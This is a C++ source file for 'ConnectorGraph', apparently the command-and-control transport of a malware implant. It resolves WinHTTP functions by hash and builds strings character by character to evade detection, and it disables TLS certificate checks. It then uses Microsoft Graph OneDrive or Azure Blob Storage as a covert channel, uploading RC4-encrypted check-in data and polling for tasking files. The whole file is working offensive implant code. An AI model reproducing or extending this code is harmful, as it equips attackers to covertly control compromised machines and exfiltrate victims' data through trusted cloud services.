#include "ConnectorGraph.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"

#define HASH_FUNC_WINHTTPOPEN                    0x3d31aa04
#define HASH_FUNC_WINHTTPCONNECT                 0xbb60313c
#define HASH_FUNC_WINHTTPOPENREQUEST             0xffbc892d
#define HASH_FUNC_WINHTTPSENDREQUEST             0xc688ca05
#define HASH_FUNC_WINHTTPRECEIVERESPONSE         0x909ba404
#define HASH_FUNC_WINHTTPQUERYDATAAVAILABLE      0xf8479123
#define HASH_FUNC_WINHTTPREADDATA                0xde72d8a8
#define HASH_FUNC_WINHTTPWRITEDATA               0x7fcbd1d7
#define HASH_FUNC_WINHTTPCLOSEHANDLE             0xf6845834
#define HASH_FUNC_WINHTTPSETOPTION               0xf2690497
#define HASH_FUNC_WINHTTPQUERYHEADERS            0x0548a6e4
#define HASH_FUNC_WINHTTPADDREQUESTHEADERS       0xb8ee0200
#define HASH_FUNC_WINHTTPCRACKURL                0xef3e8849

void* ConnectorGraph::operator new(size_t sz)
{
	return MemAllocLocal(sz);
}

void ConnectorGraph::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorGraph));
}

ConnectorGraph::ConnectorGraph()
{
	this->functions = (GRAPHFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(GRAPHFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;
	this->functions->Sleep        = ApiWin->Sleep;
	this->functions->GetTickCount = ApiWin->GetTickCount;

	CHAR winhttp_c[12];
	winhttp_c[0]  = HdChrA('w');
	winhttp_c[1]  = HdChrA('i');
	winhttp_c[2]  = HdChrA('n');
	winhttp_c[3]  = HdChrA('h');
	winhttp_c[4]  = HdChrA('t');
	winhttp_c[5]  = HdChrA('t');
	winhttp_c[6]  = HdChrA('p');
	winhttp_c[7]  = HdChrA('.');
	winhttp_c[8]  = HdChrA('d');
	winhttp_c[9]  = HdChrA('l');
	winhttp_c[10] = HdChrA('l');
	winhttp_c[11] = HdChrA(0);

	HMODULE hWinHttpModule = this->functions->LoadLibraryA(winhttp_c);
	if (hWinHttpModule) {
		this->functions->WinHttpOpen                 = (decltype(WinHttpOpen)*)                 GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPOPEN);
		this->functions->WinHttpConnect              = (decltype(WinHttpConnect)*)              GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPCONNECT);
		this->functions->WinHttpOpenRequest          = (decltype(WinHttpOpenRequest)*)          GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPOPENREQUEST);
		this->functions->WinHttpSendRequest          = (decltype(WinHttpSendRequest)*)          GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPSENDREQUEST);
		this->functions->WinHttpReceiveResponse      = (decltype(WinHttpReceiveResponse)*)      GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPRECEIVERESPONSE);
		this->functions->WinHttpQueryDataAvailable   = (decltype(WinHttpQueryDataAvailable)*)   GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
		this->functions->WinHttpReadData             = (decltype(WinHttpReadData)*)             GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPREADDATA);
		this->functions->WinHttpWriteData            = (decltype(WinHttpWriteData)*)            GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPWRITEDATA);
		this->functions->WinHttpCloseHandle          = (decltype(WinHttpCloseHandle)*)          GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPCLOSEHANDLE);
		this->functions->WinHttpSetOption            = (decltype(WinHttpSetOption)*)            GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPSETOPTION);
		this->functions->WinHttpQueryHeaders         = (decltype(WinHttpQueryHeaders)*)         GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPQUERYHEADERS);
		this->functions->WinHttpAddRequestHeaders    = (decltype(WinHttpAddRequestHeaders)*)    GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
		this->functions->WinHttpCrackUrl             = (decltype(WinHttpCrackUrl)*)             GetSymbolAddress(hWinHttpModule, HASH_FUNC_WINHTTPCRACKURL);
	}
}

// ============================================================
//  String utilities
// ============================================================

WCHAR* ConnectorGraph::AtoW(CHAR* str)
{
	if (!str) return NULL;
	ULONG len = StrLenA(str);
	WCHAR* wstr = (WCHAR*) this->functions->LocalAlloc(LPTR, (len + 1) * sizeof(WCHAR));
	for (ULONG i = 0; i <= len; i++)
		wstr[i] = (WCHAR) str[i];
	return wstr;
}

void ConnectorGraph::FreeW(WCHAR* str)
{
	if (str) this->functions->LocalFree(str);
}

CHAR* ConnectorGraph::PercentEncode(CHAR* str)
{
	if (!str) return NULL;
	ULONG len = StrLenA(str);
	ULONG outLen = 0;

	for (ULONG i = 0; i < len; i++) {
		BYTE c = (BYTE)str[i];
		if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
		    (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
			outLen++;
		} else {
			outLen += 3;
		}
	}

	CHAR hex[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
	CHAR* out = (CHAR*) this->functions->LocalAlloc(LPTR, outLen + 1);
	ULONG oi = 0;

	for (ULONG i = 0; i < len; i++) {
		BYTE c = (BYTE)str[i];
		if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
		    (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
			out[oi++] = (CHAR)c;
		} else {
			out[oi++] = '%';
			out[oi++] = hex[(c >> 4) & 0xF];
			out[oi++] = hex[c & 0xF];
		}
	}
	out[oi] = 0;
	return out;
}

CHAR* ConnectorGraph::BuildNonce()
{
	ULONG r = GenerateRandom32();
	CHAR* nonce = (CHAR*) this->functions->LocalAlloc(LPTR, 9);
	CHAR hex[] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
	for (int i = 7; i >= 0; i--) {
		nonce[i] = hex[r & 0xF];
		r >>= 4;
	}
	nonce[8] = 0;
	return nonce;
}

// ============================================================
//  HTTP request engine (shared by both modes)
// ============================================================

BOOL ConnectorGraph::DoHttpRequest(WCHAR* host, WORD port, BOOL ssl, WCHAR* verb,
                                    WCHAR* path, BYTE* headers, ULONG headersLen,
                                    BYTE* body, ULONG bodyLen,
                                    BYTE** result, ULONG* outSize, DWORD* statusOut)
{
	*outSize = 0;
	*result = NULL;
	*statusOut = 0;

	int maxRetries = 2;
	for (int attempt = 0; attempt < maxRetries; attempt++) {

		WCHAR ua[] = { 'M','o','z','i','l','l','a','/','5','.','0', 0 };
		HINTERNET hSession = this->functions->WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		                                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (!hSession) return FALSE;

		HINTERNET hConnect = this->functions->WinHttpConnect(hSession, host, port, 0);
		if (!hConnect) {
			this->functions->WinHttpCloseHandle(hSession);
			return FALSE;
		}

		DWORD flags = ssl ? WINHTTP_FLAG_SECURE : 0;
		HINTERNET hRequest = this->functions->WinHttpOpenRequest(hConnect, verb, path, NULL, WINHTTP_NO_REFERER,
		                                                          WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
		if (!hRequest) {
			this->functions->WinHttpCloseHandle(hConnect);
			this->functions->WinHttpCloseHandle(hSession);
			return FALSE;
		}

		if (ssl) {
			DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
			                SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
			this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
		}

		if (headers && headersLen > 0) {
			WCHAR* wHeaders = AtoW((CHAR*)headers);
			this->functions->WinHttpAddRequestHeaders(hRequest, wHeaders, (DWORD)-1,
			                                           WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
			FreeW(wHeaders);
		}

		BOOL sent = this->functions->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		                                                  body, bodyLen, bodyLen, 0);
		if (!sent) {
			this->functions->WinHttpCloseHandle(hRequest);
			this->functions->WinHttpCloseHandle(hConnect);
			this->functions->WinHttpCloseHandle(hSession);
			return FALSE;
		}

		BOOL received = this->functions->WinHttpReceiveResponse(hRequest, NULL);
		if (!received) {
			this->functions->WinHttpCloseHandle(hRequest);
			this->functions->WinHttpCloseHandle(hConnect);
			this->functions->WinHttpCloseHandle(hSession);
			return FALSE;
		}

		DWORD statusCode = 0;
		DWORD statusSize = sizeof(DWORD);
		this->functions->WinHttpQueryHeaders(hRequest,
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
			WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

		if ((statusCode == 429 || statusCode == 503) && attempt < maxRetries - 1) {
			this->functions->WinHttpCloseHandle(hRequest);
			this->functions->WinHttpCloseHandle(hConnect);
			this->functions->WinHttpCloseHandle(hSession);
			this->functions->Sleep(60000);
			continue;
		}

		*statusOut = statusCode;

		ULONG totalRead = 0;
		BYTE* buffer = NULL;
		DWORD dwAvailable = 0;
		DWORD dwRead = 0;

		while (1) {
			dwAvailable = 0;
			if (!this->functions->WinHttpQueryDataAvailable(hRequest, &dwAvailable))
				break;
			if (!dwAvailable)
				break;

			if (!buffer) {
				buffer = (BYTE*) this->functions->LocalAlloc(LPTR, dwAvailable);
			} else {
				buffer = (BYTE*) this->functions->LocalReAlloc(buffer, totalRead + dwAvailable, LMEM_MOVEABLE);
			}
			dwRead = 0;
			if (!this->functions->WinHttpReadData(hRequest, buffer + totalRead, dwAvailable, &dwRead))
				break;
			totalRead += dwRead;
		}

		*result = buffer;
		*outSize = totalRead;

		this->functions->WinHttpCloseHandle(hRequest);
		this->functions->WinHttpCloseHandle(hConnect);
		this->functions->WinHttpCloseHandle(hSession);

		return TRUE;
	}
	return FALSE;
}

// ============================================================
//  Graph API (OneDrive) methods
// ============================================================

CHAR* ConnectorGraph::BuildAuthHeader()
{
	CHAR authPrefix[] = "Authorization: Bearer ";
	ULONG prefixLen = StrLenA(authPrefix);
	ULONG totalLen = prefixLen + this->tokenLen + 2 + 1;
	CHAR* header = (CHAR*) this->functions->LocalAlloc(LPTR, totalLen);
	ULONG idx = 0;
	memcpy(header + idx, authPrefix, prefixLen); idx += prefixLen;
	memcpy(header + idx, this->accessToken, this->tokenLen); idx += this->tokenLen;
	header[idx++] = '\r';
	header[idx++] = '\n';
	header[idx] = 0;
	return header;
}

void ConnectorGraph::FreeAuthHeader(CHAR* header, ULONG len)
{
	if (header) {
		memset(header, 0, len);
		this->functions->LocalFree(header);
	}
}

CHAR* ConnectorGraph::BuildGraphPath(CHAR* suffix)
{
	ULONG userLen   = StrLenA((CHAR*)this->user_id);
	ULONG folderLen = StrLenA((CHAR*)this->folder_path);
	ULONG suffixLen = StrLenA(suffix);

	ULONG totalLen = 12 + userLen + 12 + folderLen + 1 + suffixLen + 1;
	CHAR* path = (CHAR*) this->functions->LocalAlloc(LPTR, totalLen);

	ULONG idx = 0;
	memcpy(path + idx, "/v1.0/users/", 12); idx += 12;
	memcpy(path + idx, this->user_id, userLen); idx += userLen;
	memcpy(path + idx, "/drive/root:", 12); idx += 12;
	memcpy(path + idx, this->folder_path, folderLen); idx += folderLen;
	path[idx++] = '/';
	memcpy(path + idx, suffix, suffixLen); idx += suffixLen;
	path[idx] = 0;

	return path;
}

BOOL ConnectorGraph::NeedsTokenRefresh()
{
	if (!this->accessToken || this->tokenLen == 0)
		return TRUE;

	DWORD now = this->functions->GetTickCount();
	DWORD elapsed;
	if (now >= this->tokenTimestamp)
		elapsed = now - this->tokenTimestamp;
	else
		elapsed = (0xFFFFFFFF - this->tokenTimestamp) + now + 1;

	return (elapsed >= this->tokenRefreshInterval);
}

BOOL ConnectorGraph::RefreshToken()
{
	if (this->accessToken) {
		memset(this->accessToken, 0, this->tokenLen);
		this->functions->LocalFree(this->accessToken);
		this->accessToken = NULL;
		this->tokenLen = 0;
	}

	CHAR* encClientId     = PercentEncode((CHAR*)this->client_id);
	CHAR* encClientSecret = PercentEncode((CHAR*)this->client_secret);

	CHAR scope[] = "https%3A%2F%2Fgraph.microsoft.com%2F.default";
	CHAR grantType[] = "client_credentials";

	ULONG encCidLen = StrLenA(encClientId);
	ULONG encCsLen  = StrLenA(encClientSecret);
	ULONG scopeLen  = StrLenA(scope);
	ULONG gtLen     = StrLenA(grantType);

	ULONG bodyLen = 10 + encCidLen + 15 + encCsLen + 7 + scopeLen + 12 + gtLen;
	CHAR* postBody = (CHAR*) this->functions->LocalAlloc(LPTR, bodyLen + 1);
	ULONG idx = 0;

	memcpy(postBody + idx, "client_id=", 10); idx += 10;
	memcpy(postBody + idx, encClientId, encCidLen); idx += encCidLen;
	memcpy(postBody + idx, "&client_secret=", 15); idx += 15;
	memcpy(postBody + idx, encClientSecret, encCsLen); idx += encCsLen;
	memcpy(postBody + idx, "&scope=", 7); idx += 7;
	memcpy(postBody + idx, scope, scopeLen); idx += scopeLen;
	memcpy(postBody + idx, "&grant_type=", 12); idx += 12;
	memcpy(postBody + idx, grantType, gtLen); idx += gtLen;
	postBody[idx] = 0;

	this->functions->LocalFree(encClientId);
	memset(encClientSecret, 0, encCsLen);
	this->functions->LocalFree(encClientSecret);

	ULONG tenantLen = StrLenA((CHAR*)this->tenant_id);
	ULONG pathLen = 1 + tenantLen + 18 + 1;
	CHAR* pathA = (CHAR*) this->functions->LocalAlloc(LPTR, pathLen);
	ULONG pi = 0;
	pathA[pi++] = '/';
	memcpy(pathA + pi, this->tenant_id, tenantLen); pi += tenantLen;
	memcpy(pathA + pi, "/oauth2/v2.0/token", 18); pi += 18;
	pathA[pi] = 0;

	CHAR headerStr[] = "Content-Type: application/x-www-form-urlencoded\r\n";

	WCHAR loginHost[] = { 'l','o','g','i','n','.','m','i','c','r','o','s','o','f','t','o','n','l','i','n','e','.','c','o','m', 0 };
	WCHAR verbPost[]  = { 'P','O','S','T', 0 };
	WCHAR* wPath = AtoW(pathA);

	BYTE* resp = NULL;
	ULONG respSize = 0;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(loginHost, 443, TRUE, verbPost, wPath,
	                         (BYTE*)headerStr, StrLenA(headerStr),
	                         (BYTE*)postBody, idx,
	                         &resp, &respSize, &statusCode);

	FreeW(wPath);
	this->functions->LocalFree(pathA);
	memset(postBody, 0, bodyLen);
	this->functions->LocalFree(postBody);

	if (!ok || statusCode != 200 || !resp || respSize == 0) {
		if (resp) this->functions->LocalFree(resp);
		return FALSE;
	}

	CHAR needle[] = "\"access_token\":\"";
	ULONG needleLen = StrLenA(needle);
	CHAR* pos = NULL;

	for (ULONG i = 0; i + needleLen < respSize; i++) {
		if (StrNCmpA((CHAR*)resp + i, needle, needleLen) == 0) {
			pos = (CHAR*)resp + i + needleLen;
			break;
		}
	}

	if (!pos) {
		memset(resp, 0, respSize);
		this->functions->LocalFree(resp);
		return FALSE;
	}

	CHAR* end = pos;
	while (*end && *end != '"') end++;
	ULONG tokLen = (ULONG)(end - pos);

	this->accessToken = (BYTE*) this->functions->LocalAlloc(LPTR, tokLen + 1);
	memcpy(this->accessToken, pos, tokLen);
	this->accessToken[tokLen] = 0;
	this->tokenLen = tokLen;

	this->tokenTimestamp = this->functions->GetTickCount();

	memset(resp, 0, respSize);
	this->functions->LocalFree(resp);

	return TRUE;
}

BOOL ConnectorGraph::UploadFile(CHAR* filename, BYTE* data, ULONG dataSize)
{
	CHAR contentSuffix[] = ":/content";
	ULONG fnLen = StrLenA(filename);
	CHAR* fileSuffix = (CHAR*) this->functions->LocalAlloc(LPTR, fnLen + 9 + 1);
	memcpy(fileSuffix, filename, fnLen);
	memcpy(fileSuffix + fnLen, contentSuffix, 9);
	fileSuffix[fnLen + 9] = 0;

	CHAR* path = BuildGraphPath(fileSuffix);
	this->functions->LocalFree(fileSuffix);

	CHAR* authHeader = BuildAuthHeader();
	ULONG authLen = StrLenA(authHeader);

	WCHAR graphHost[] = { 'g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m', 0 };
	WCHAR verbPut[]   = { 'P','U','T', 0 };
	WCHAR* wPath = AtoW(path);

	BYTE* resp = NULL;
	ULONG respSize = 0;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(graphHost, 443, TRUE, verbPut, wPath,
	                         (BYTE*)authHeader, authLen,
	                         data, dataSize,
	                         &resp, &respSize, &statusCode);

	FreeW(wPath);
	this->functions->LocalFree(path);
	FreeAuthHeader(authHeader, authLen);

	if (resp) {
		memset(resp, 0, respSize);
		this->functions->LocalFree(resp);
	}

	if (!ok) return FALSE;
	return (statusCode >= 200 && statusCode <= 299);
}

BYTE* ConnectorGraph::DownloadFile(CHAR* filename, ULONG* outSize)
{
	*outSize = 0;

	CHAR contentSuffix[] = ":/content";
	ULONG fnLen = StrLenA(filename);
	CHAR* fileSuffix = (CHAR*) this->functions->LocalAlloc(LPTR, fnLen + 9 + 1);
	memcpy(fileSuffix, filename, fnLen);
	memcpy(fileSuffix + fnLen, contentSuffix, 9);
	fileSuffix[fnLen + 9] = 0;

	CHAR* path = BuildGraphPath(fileSuffix);
	this->functions->LocalFree(fileSuffix);

	CHAR* authHeader = BuildAuthHeader();
	ULONG authLen = StrLenA(authHeader);

	WCHAR graphHost[] = { 'g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m', 0 };
	WCHAR verbGet[]   = { 'G','E','T', 0 };
	WCHAR* wPath = AtoW(path);

	BYTE* resp = NULL;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(graphHost, 443, TRUE, verbGet, wPath,
	                         (BYTE*)authHeader, authLen,
	                         NULL, 0,
	                         &resp, outSize, &statusCode);

	FreeW(wPath);
	this->functions->LocalFree(path);
	FreeAuthHeader(authHeader, authLen);

	if (!ok || statusCode != 200) {
		if (resp) this->functions->LocalFree(resp);
		*outSize = 0;
		return NULL;
	}

	return resp;
}

BOOL ConnectorGraph::DeleteRemoteFile(CHAR* filename)
{
	CHAR* path = BuildGraphPath(filename);

	CHAR* authHeader = BuildAuthHeader();
	ULONG authLen = StrLenA(authHeader);

	WCHAR graphHost[] = { 'g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m', 0 };
	WCHAR verbDel[]   = { 'D','E','L','E','T','E', 0 };
	WCHAR* wPath = AtoW(path);

	BYTE* resp = NULL;
	ULONG respSize = 0;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(graphHost, 443, TRUE, verbDel, wPath,
	                         (BYTE*)authHeader, authLen,
	                         NULL, 0,
	                         &resp, &respSize, &statusCode);

	FreeW(wPath);
	this->functions->LocalFree(path);
	FreeAuthHeader(authHeader, authLen);

	if (resp) this->functions->LocalFree(resp);

	if (!ok) return FALSE;
	return (statusCode == 204 || statusCode == 200 || statusCode == 404);
}

// ============================================================
//  Azure Blob Storage methods
// ============================================================

WCHAR* ConnectorGraph::BuildBlobHost()
{
	ULONG accountLen = StrLenA((CHAR*)this->storageAccount);
	CHAR suffix[] = ".blob.core.windows.net";
	ULONG suffixLen = StrLenA(suffix);
	ULONG totalLen = accountLen + suffixLen + 1;

	CHAR* hostA = (CHAR*) this->functions->LocalAlloc(LPTR, totalLen);
	memcpy(hostA, this->storageAccount, accountLen);
	memcpy(hostA + accountLen, suffix, suffixLen);
	hostA[accountLen + suffixLen] = 0;

	WCHAR* hostW = AtoW(hostA);
	this->functions->LocalFree(hostA);
	return hostW;
}

CHAR* ConnectorGraph::BuildBlobPath(CHAR* filename)
{
	ULONG containerLen = StrLenA((CHAR*)this->containerName);
	ULONG filenameLen  = StrLenA(filename);
	ULONG sasLen       = StrLenA((CHAR*)this->sasToken);

	ULONG totalLen = 1 + containerLen + 1 + filenameLen + 1 + sasLen + 1;
	CHAR* path = (CHAR*) this->functions->LocalAlloc(LPTR, totalLen);

	ULONG idx = 0;
	path[idx++] = '/';
	memcpy(path + idx, this->containerName, containerLen); idx += containerLen;
	path[idx++] = '/';
	memcpy(path + idx, filename, filenameLen); idx += filenameLen;
	path[idx++] = '?';
	memcpy(path + idx, this->sasToken, sasLen); idx += sasLen;
	path[idx] = 0;

	return path;
}

BOOL ConnectorGraph::BlobUploadFile(CHAR* filename, BYTE* data, ULONG dataSize)
{
	CHAR* pathA = BuildBlobPath(filename);
	WCHAR* host = BuildBlobHost();
	WCHAR verbPut[] = { 'P','U','T', 0 };
	WCHAR* wPath = AtoW(pathA);

	CHAR headerStr[] = "x-ms-blob-type: BlockBlob\r\nx-ms-version: 2020-10-02\r\n";

	BYTE* resp = NULL;
	ULONG respSize = 0;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(host, 443, TRUE, verbPut, wPath,
	                         (BYTE*)headerStr, StrLenA(headerStr),
	                         data, dataSize,
	                         &resp, &respSize, &statusCode);

	FreeW(wPath);
	FreeW(host);
	this->functions->LocalFree(pathA);

	if (resp) {
		memset(resp, 0, respSize);
		this->functions->LocalFree(resp);
	}

	if (!ok) return FALSE;
	return (statusCode == 201 || statusCode == 200);
}

BYTE* ConnectorGraph::BlobDownloadFile(CHAR* filename, ULONG* outSize)
{
	*outSize = 0;

	CHAR* pathA = BuildBlobPath(filename);
	WCHAR* host = BuildBlobHost();
	WCHAR verbGet[] = { 'G','E','T', 0 };
	WCHAR* wPath = AtoW(pathA);

	CHAR headerStr[] = "x-ms-version: 2020-10-02\r\n";

	BYTE* resp = NULL;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(host, 443, TRUE, verbGet, wPath,
	                         (BYTE*)headerStr, StrLenA(headerStr),
	                         NULL, 0,
	                         &resp, outSize, &statusCode);

	FreeW(wPath);
	FreeW(host);
	this->functions->LocalFree(pathA);

	if (!ok || statusCode != 200) {
		if (resp) this->functions->LocalFree(resp);
		*outSize = 0;
		return NULL;
	}

	return resp;
}

BOOL ConnectorGraph::BlobDeleteRemoteFile(CHAR* filename)
{
	CHAR* pathA = BuildBlobPath(filename);
	WCHAR* host = BuildBlobHost();
	WCHAR verbDel[] = { 'D','E','L','E','T','E', 0 };
	WCHAR* wPath = AtoW(pathA);

	CHAR headerStr[] = "x-ms-version: 2020-10-02\r\n";

	BYTE* resp = NULL;
	ULONG respSize = 0;
	DWORD statusCode = 0;
	BOOL ok = DoHttpRequest(host, 443, TRUE, verbDel, wPath,
	                         (BYTE*)headerStr, StrLenA(headerStr),
	                         NULL, 0,
	                         &resp, &respSize, &statusCode);

	FreeW(wPath);
	FreeW(host);
	this->functions->LocalFree(pathA);

	if (resp) this->functions->LocalFree(resp);

	if (!ok) return FALSE;
	return (statusCode == 202 || statusCode == 200 || statusCode == 404);
}

// ============================================================
//  Dispatch wrappers
// ============================================================

BOOL ConnectorGraph::DoUpload(CHAR* filename, BYTE* data, ULONG dataSize)
{
	if (this->storageType == STORAGE_BLOB)
		return BlobUploadFile(filename, data, dataSize);
	return UploadFile(filename, data, dataSize);
}

BYTE* ConnectorGraph::DoDownload(CHAR* filename, ULONG* outSize)
{
	if (this->storageType == STORAGE_BLOB)
		return BlobDownloadFile(filename, outSize);
	return DownloadFile(filename, outSize);
}

BOOL ConnectorGraph::DoDelete(CHAR* filename)
{
	if (this->storageType == STORAGE_BLOB)
		return BlobDeleteRemoteFile(filename);
	return DeleteRemoteFile(filename);
}

// ============================================================
//  Profile + Exchange
// ============================================================

BOOL ConnectorGraph::SetProfile(void* profilePtr, BYTE* beat, ULONG bSize)
{
	ProfileGraph profile = *(ProfileGraph*)profilePtr;

	this->storageType = profile.storage_type;

	if (this->storageType == STORAGE_ONEDRIVE) {
		this->tenant_id     = profile.tenant_id;
		this->client_id     = profile.client_id;
		this->client_secret = profile.client_secret;
		this->user_id       = profile.user_id;
		this->folder_path   = profile.folder_path;
	} else {
		this->storageAccount = profile.storage_account;
		this->containerName  = profile.container_name;
		this->sasToken       = profile.sas_token;
	}

	if (profile.poll_attempts > 0)
		this->pollAttempts = profile.poll_attempts;
	if (profile.poll_interval_ms > 0)
		this->pollIntervalMs = profile.poll_interval_ms;

	LPSTR encBeat = b64_encode(beat, bSize);
	ULONG encBeatLen = StrLenA(encBeat);

	this->beatData = (BYTE*) this->functions->LocalAlloc(LPTR, encBeatLen);
	memcpy(this->beatData, encBeat, encBeatLen);
	this->beatSize = encBeatLen;

	this->functions->LocalFree(encBeat);

	if (this->storageType == STORAGE_ONEDRIVE)
		return RefreshToken();

	return TRUE;
}

void ConnectorGraph::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (this->storageType == STORAGE_ONEDRIVE) {
		if (NeedsTokenRefresh()) {
			if (!RefreshToken())
				return;
		}
	}

	CHAR* nonce = BuildNonce();

	CHAR checkinFn[16];
	checkinFn[0] = 'c'; checkinFn[1] = '_';
	memcpy(checkinFn + 2, nonce, 8);
	checkinFn[10] = '.'; checkinFn[11] = 'd'; checkinFn[12] = 'a'; checkinFn[13] = 't'; checkinFn[14] = 0;

	ULONG uploadSize = 4 + this->beatSize;
	BYTE* uploadBuf = NULL;

	if (plainData && plainSize > 0) {
		EncryptRC4(plainData, plainSize, sessionKey, 16);
		uploadSize += plainSize;
	}

	uploadBuf = (BYTE*) this->functions->LocalAlloc(LPTR, uploadSize);
	uploadBuf[0] = (BYTE)((this->beatSize >> 24) & 0xFF);
	uploadBuf[1] = (BYTE)((this->beatSize >> 16) & 0xFF);
	uploadBuf[2] = (BYTE)((this->beatSize >> 8) & 0xFF);
	uploadBuf[3] = (BYTE)(this->beatSize & 0xFF);
	memcpy(uploadBuf + 4, this->beatData, this->beatSize);
	if (plainData && plainSize > 0)
		memcpy(uploadBuf + 4 + this->beatSize, plainData, plainSize);

	BOOL uploaded = DoUpload(checkinFn, uploadBuf, uploadSize);
	if (!uploaded && this->storageType == STORAGE_ONEDRIVE) {
		if (RefreshToken())
			uploaded = DoUpload(checkinFn, uploadBuf, uploadSize);
	}

	memset(uploadBuf, 0, uploadSize);
	this->functions->LocalFree(uploadBuf);

	if (!uploaded) {
		this->functions->LocalFree(nonce);
		return;
	}

	CHAR responseFn[16];
	responseFn[0] = 'r'; responseFn[1] = '_';
	memcpy(responseFn + 2, nonce, 8);
	responseFn[10] = '.'; responseFn[11] = 'd'; responseFn[12] = 'a'; responseFn[13] = 't'; responseFn[14] = 0;

	this->functions->LocalFree(nonce);

	if (this->recvData) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
	}
	this->recvData = NULL;
	this->recvSize = 0;

	for (ULONG attempt = 0; attempt < this->pollAttempts; attempt++) {
		this->functions->Sleep(this->pollIntervalMs);

		ULONG dlSize = 0;
		BYTE* dlData = DoDownload(responseFn, &dlSize);
		if (dlData && dlSize > 0) {
			this->recvData = dlData;
			this->recvSize = (int) dlSize;
			DoDelete(responseFn);
			break;
		}
		if (dlData)
			this->functions->LocalFree(dlData);
	}

	if (this->recvSize > 0 && this->recvData) {
		DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
	}
}

BYTE* ConnectorGraph::RecvData()
{
	return this->recvData;
}

int ConnectorGraph::RecvSize()
{
	return this->recvSize;
}

void ConnectorGraph::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
		this->recvSize = 0;
	}
}

void ConnectorGraph::CloseConnector()
{
	if (this->accessToken) {
		memset(this->accessToken, 0, this->tokenLen);
		this->functions->LocalFree(this->accessToken);
		this->accessToken = NULL;
		this->tokenLen = 0;
	}
	if (this->beatData) {
		memset(this->beatData, 0, this->beatSize);
		this->functions->LocalFree(this->beatData);
		this->beatData = NULL;
		this->beatSize = 0;
	}
}
